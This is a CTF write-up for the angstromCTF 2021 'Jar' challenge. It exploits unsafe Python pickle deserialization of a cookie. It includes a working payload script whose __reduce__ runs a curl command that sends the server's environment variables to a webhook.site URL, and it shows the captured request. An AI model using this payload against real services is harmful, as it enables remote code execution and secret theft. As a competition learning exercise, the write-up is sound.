# Jar - angstromCTF 2021

- Category: Web
- Points: 70
- Solves: 352
- Solved by: Lu191

## Description

My other pickle challenges seem to be giving you all a hard time, so here's a [simpler one](https://jar.2021.chall.actf.co/) to get you warmed up.

**Hint**: The Python [documentation](https://docs.python.org/3/library/pickle.html) for pickle has this big red box... I hope it's not important.

[jar.py](dist/jar.py), [pickle.jpg](dist/pickle.jpg), [Dockerfile](dist/Dockerfile)

## Solution

The hint is pretty clear here, after checking the python documentation about the pickle library we know that pickle module is not secure.
There is written that to unpickle data you trust, because it is possible to construct malicious pickle data which will execute arbitrary code during unpickling. 
The web app seems vulnerable to this because it's unpickling data that we can manipulate.

``` 
contents = request.cookies.get('contents')
if contents: items = pickle.loads(base64.b64decode(contents)) 
``` 

So all we need to do, it's to craft our malicious payload, then convert it to base64 and overwrite our cookies with this base64 encoded string.
And then after reloading the page our command should be executed by the remote server.

I wrote a simple script to craft the payload, that will execute a curl command to exfiltrate data/info from the server, in this case I knew that the flag was hidden in an environment variable, so I tried to exfiltrate the output of the command via curl. 

``` 
import _pickle as cPickle
import base64

class MMM(object):
    def __reduce__(self):
        import os
        s = "curl https://webhook.site/ca372177-33df-4ad1-9ead-77ec486720eb/$(printenv | base64 -w 0)"
        return (os.popen, (s,))

payload = cPickle.dumps(MMM())
print(base64.b64encode(payload))
``` 

And after overwriting my "contents" cookie, and refreshing the page I got the request from the server that contains the output I needed.

``` 
GET 	https://webhook.site/ca372177-33df-4ad1-9ead-77ec486720eb/VklSVFVBTF9IT1NUPWphci4yMDIxLmNoYWxsLmFjdGYuY28KSE9TVE5BTUU9MDI0MzQ3YWYzMGJlClBZVEhPTl9QSVBfVkVSU0lPTj0yMS4wLjEKSE9NRT0vbm9uZXhpc3RlbnQKR1BHX0tFWT1FM0ZGMjgzOUMwNDhCMjVDMDg0REVCRTlCMjY5OTVFMzEwMjUwNTY4ClBZVEhPTl9HRVRfUElQX1VSTD1odHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy8yOWYzN2RiZTZiMzg0MmNjZDUyZDYxODE2YTMwNDQxNzM5NjJlYmViL3B1YmxpYy9nZXQtcGlwLnB5ClBBVEg9L3Vzci9sb2NhbC9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluCkxBTkc9Qy5VVEYtOApQWVRIT05fVkVSU0lPTj0zLjkuMwpQV0Q9L3NydgpQWVRIT05fR0VUX1BJUF9TSEEyNTY9ZTAzZWI4YTMzZDNiNDQxZmY0ODRjNTZhNDM2ZmYxMDY4MDQ3OWQ0YmQxNGU1OTI2OGU2Nzk3N2VkNDA5MDRkZQpGTEFHPWFjdGZ7eW91X2dvdF95b3Vyc2VsZl9vdXRfb2ZfYV9waWNrbGV9Cg==
Host 	52.207.14.64 whois
``` 

After decoding the base64 string that I got via the request submitted by the server, we get the flag.

## Flag

actf{you_got_yourself_out_of_a_pickle}
